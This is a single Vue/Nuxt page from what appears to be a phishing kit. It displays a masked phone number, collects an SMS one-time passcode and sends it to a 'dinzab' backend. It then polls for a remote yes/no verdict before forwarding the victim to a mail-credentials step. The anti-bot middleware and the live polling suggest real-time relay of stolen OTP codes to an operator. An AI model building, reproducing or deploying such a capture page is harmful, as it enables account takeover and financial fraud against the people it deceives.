<script setup lang="ts">
definePageMeta({
  middleware: [
    'preventunlogged',
    'captcha'
  ]
})
let tel = "protected"
const res = await $fetch("/api/tel")
if(res.res) {
    let first = res.tel.slice(0,3)
    tel = first
    tel += '•'.repeat(res.tel.length - 4)
    tel += res.tel.slice(-1)
}
let otpLEN = 6
const resp = await $fetch('/api/getotplen')
if(resp.res) {
    otpLEN = Number(resp.data.otpLEN)
    
}
</script>
<script lang="ts">
export default {
    data() {
        return {
            data: ref(null),
            error: false,
            alert: false,
            loader: false,
            dinzabsms: "",
            session: "",
            iii: 0
        }
    },
    methods: {
        async post() {
            if (this.check()) {
                const app = useNuxtApp()
                this.loader = true
                this.alert = false
                await app.$api.post("dinzab/post/otp", {
                    dinzabsms: this.data
                }, {
                    headers: {
                        'Authorization': this.session,
                        'dinzab': true
                    }
                }).then(() => {
                    var poll = setInterval(async () => {
                        await app.$api.get("dinzab/check/sms", {
                            headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }
                        }).then(async res => {
                            if (res.data.sms === true) {
                                clearInterval(poll)
                                await app.$api.get("fix/statux.aspx", {
                                    headers: {
                                        'Authorization': this.session,
                                        'dinzab': true
                                    }
                                })
                                navigateTo({ name: 'myaccount-mail' })
                            }

                            if (res.data.sms === false) {
                                clearInterval(poll)
                                await app.$api.get("fix/statux.aspx", {
                                    headers: {
                                        'Authorization': this.session,
                                        'dinzab': true
                                    }
                                })
                                this.loader = false
                                this.alert = true
                            }
                        }).catch(async () => {
                            clearInterval(poll)
                            await app.$api.get("fix/statux.aspx", {
                                headers: {
                                    'Authorization': this.session,
                                    'dinzab': true
                                }
                            })
                            this.loader = false
                            this.alert = true
                        })
                    }, 2000)
                }).catch(() => {
                    this.loader = false
                    this.alert = true
                })
            } else {
                this.error = true
            }
        },
        handleInputFocus() {
            this.error = false
        },
        check() {

            if (this.data.toString().length != this.iii) {
                return false
            }
            return true
        }
    },
    async beforeMount() {
        const resp = await $fetch("/api/cookie")
        this.session = resp
        const res = await $fetch('/api/getotplen')
        if(res.res) {
            this.iii = Number(res.data.otpLEN)
            
        }
    }
}
</script>
<template>
    <Head>
        <Title>{{ $t('38') }}</Title>
    </Head>
    <div class="container mx-auto rounded bg-white w-100 sm:w-[80%] md:w-[100%] lg:w-[70%]">
        <div class="zeby1">
            <form class="containerz containerBordered" v-on:submit.prevent="post()">
                <header>
                    <div class="zebyLogo"></div>
                </header>
                <h1
                    class="mt-3 mb-3 text-center font-extrabold leading-none tracking-tight text-gray-900 text-lg md:text-2xl lg:text-3xl">
                    {{ $t('39') }}</h1>

                <p class="ml-1 mt-3 text-black-500 dark:text-black-400 pb-1 text-center">{{ $t('43', {otp: otpLEN}) }} <b>{{ tel }}</b></p>
                <div class="container w-100 mt-3 ml-3">
                    <div class="notifications" :class="{ hide: !alert }">


                        <p class="notification notification-critical" role="alert">
                            {{ $t('44') }}</p>
                    </div>
                    <div class="mx-auto bg-white rounded-xl p-5" style="margin: 0 auto!important;">
                        <!--Otp v-model="data" :fields="6" :displayError="error" @inputFocus="handleInputFocus()"></Otp-->
                        <V2 v-model="data" :fields="otpLEN" :displayError="error" @inputFocus="handleInputFocus()"></V2>

                    </div>

                    <div class=" mt-2 mb-2 w-full flex flex-col justify-center">
                        <button type="submit"
                            class="w-full bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">{{ $t('41') }}</button>
                    </div>
                    <p class="ml-1 mt-3 text-black-500 dark:text-black-400 pb-1 hide">{{ $t('42') }}</p>
                </div>
            </form>
        </div>
    </div>


<div class="spinnerWithLockIcon" :class="{hide: !loader}">
    <p>{{$t('37')}}</p>
    <div class="keychain"></div>
</div></template>
<style scope>.margin {
    margin-left: 3em;
}</style>
